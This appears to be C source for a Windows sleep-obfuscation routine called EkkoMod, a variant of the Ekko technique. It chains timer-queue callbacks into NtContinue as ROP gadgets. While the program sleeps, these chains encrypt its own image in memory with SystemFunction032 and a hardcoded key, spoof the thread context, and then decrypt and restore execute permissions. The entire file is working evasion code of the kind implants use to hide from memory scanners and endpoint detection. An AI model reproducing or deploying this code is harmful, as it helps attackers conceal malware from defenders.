#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "extra.h"

void EkkoMod(DWORD TIME_TO_SLEEP) {
	CONTEXT OriginalContext = { 0 };
	CONTEXT BackupContext = { 0 };
	CONTEXT SpoofedContext = { 0 };

	CONTEXT RopProtRW = { 0 };
	CONTEXT RopMemEnc = { 0 };
	CONTEXT RopBackup = { 0 };
	CONTEXT RopSpoof = { 0 };
	CONTEXT RopMemDec = { 0 };
	CONTEXT RopFix = { 0 };
	CONTEXT RopProtRX = { 0 };
	CONTEXT RopSetEvt = { 0 };
	CONTEXT	RopSleep = { 0 };

	HANDLE hMainThread = NULL;
	HANDLE hTimerQueue = NULL;
	HANDLE hTimer = NULL;
	HANDLE hEvent = NULL;
	PVOID ImageBase = NULL;
	DWORD ImageSize = 0;
	DWORD OldProtect = 0;

	PVOID NtContinue = NULL;

	PVOID Sysfunc032 = NULL;

	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	hTimerQueue = CreateTimerQueue();

	NtContinue = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
	NtContinue = (PBYTE)NtContinue - 0x08;
	Sysfunc032 = GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");

	USTRING Key, Img;
	CHAR KeyBuf[16] = { 0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe,0xde,0xad,0xbe,0xef,0xca,0xfe,0xba,0xbe };
	Key.Buffer = KeyBuf;
	Key.Length = Key.MaximumLength = 16;

	info("Starting EkkoMod...");
	ImageBase = GetModuleHandleA(NULL);
	ImageSize = ((PIMAGE_NT_HEADERS)((BYTE*)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

	Img.Buffer = ImageBase;
	Img.Length = Img.MaximumLength = ImageSize;

	if (CreateTimerQueueTimer(&hTimer, hTimerQueue, RtlCaptureContext, &OriginalContext, 0, 0, WT_EXECUTEINTIMERTHREAD)) {
		info("Context captured successfully");
		Sleep(100); // Meant to let the stack stabalize

		//Copying current context into multiple copies for different ROP chains
		memcpy(&RopProtRW, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopBackup, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopSpoof, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopMemEnc, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopMemDec, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopFix, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopProtRX, &OriginalContext, sizeof(CONTEXT));
		memcpy(&RopSetEvt, &OriginalContext, sizeof(CONTEXT));

		memcpy(&SpoofedContext, &OriginalContext, sizeof(CONTEXT));

		// Rsp adjustments for stack alignment
		// All threads end with ret and return to the rsp, hence in the current thread.

		// VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
		RopProtRW.Rsp -= 8; // 24 dangerous
		RopProtRW.Rip = VirtualProtect;
		RopProtRW.Rcx = ImageBase;
		RopProtRW.Rdx = ImageSize;
		RopProtRW.R8 = PAGE_READWRITE;
		RopProtRW.R9 = &OldProtect;

		// SystemFunction032 (&Key, &Img);
		RopMemEnc.Rsp -= 8; // safe
		RopMemEnc.Rip = Sysfunc032;
		RopMemEnc.Rcx = &Img;
		RopMemEnc.Rdx = &Key;

		DuplicateHandle(NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hMainThread, THREAD_ALL_ACCESS, 0, 0);
		// GetThreadContext( GetCurrentThread(), &BackupContext );
		RopBackup.Rsp -= 8; // 24 dangerous
		RopBackup.Rip = GetThreadContext;
		RopBackup.Rcx = hMainThread;
		RopBackup.Rdx = &BackupContext;

		// SetThreadContext( GetCurrentThread(), &SpoofedContext );
		RopSpoof.Rsp -= 8; // 24 dangerous
		RopSpoof.Rip = SetThreadContext;
		RopSpoof.Rcx = hMainThread;
		RopSpoof.Rdx = &SpoofedContext;

		// Sleep( TIME_TO_SLEEP );
		RopSleep.Rsp -= 8; // 24 dangerous
		RopSleep.Rip = Sleep;
		RopSleep.Rcx = TIME_TO_SLEEP;

		// SystemFunction032 (&Key, &Img);
		RopMemDec.Rsp -= 8; // 24 dangerous
		RopMemDec.Rip = Sysfunc032;
		RopMemDec.Rcx = &Img;
		RopMemDec.Rdx = &Key;

		// SetThreadContext( GetCurrentThread(), &BackupContext );
		RopFix.Rsp -= 8; // 24 dangerous
		RopFix.Rip = SetThreadContext;
		RopFix.Rcx = hMainThread;
		RopFix.Rdx = &BackupContext;

		// VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READ, &OldProtect );
		RopProtRX.Rsp -= 8; // safe
		RopProtRX.Rip = VirtualProtect;
		RopProtRX.Rcx = ImageBase;
		RopProtRX.Rdx = ImageSize;
		RopProtRX.R8 = PAGE_EXECUTE_READ;
		RopProtRX.R9 = &OldProtect;

		// SetEvent( hEvent );
		RopSetEvt.Rsp -= 8; //24  dangerous
		RopSetEvt.Rip = SetEvent;
		RopSetEvt.Rcx = hEvent;

		ok("Starting ROP chains via NtContinue...");

		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD); // will cause things in the stack to be encrypted too. hence the call stack will be gibberish.
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopBackup, 300, 0, WT_EXECUTEINTIMERTHREAD);
		RtlCaptureContext(&BackupContext); // Updating SpoofedContext with current context to make the spoofing more believable, somehow the Timer call doesnt work
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSpoof, 400, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, TIME_TO_SLEEP, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopFix, TIME_TO_SLEEP + 100, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, TIME_TO_SLEEP + 200, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, TIME_TO_SLEEP + 300, 0, WT_EXECUTEINTIMERTHREAD);

		ok("ROP chains initiated successfully.");
		ok("Waiting for hEvent");

		WaitForSingleObject(hEvent, INFINITE);

		ok("hEvent signaled. Exiting EkkoMod.");
	}
	else {
		error("CreateTimerQueueTimer failed.");
		yolo();
	}

	DeleteTimerQueue(hTimerQueue);
}

int main() {
	do {
		//Sleep(30000);
		EkkoMod(4 * 1000);
	} while (TRUE);
	return 0;
}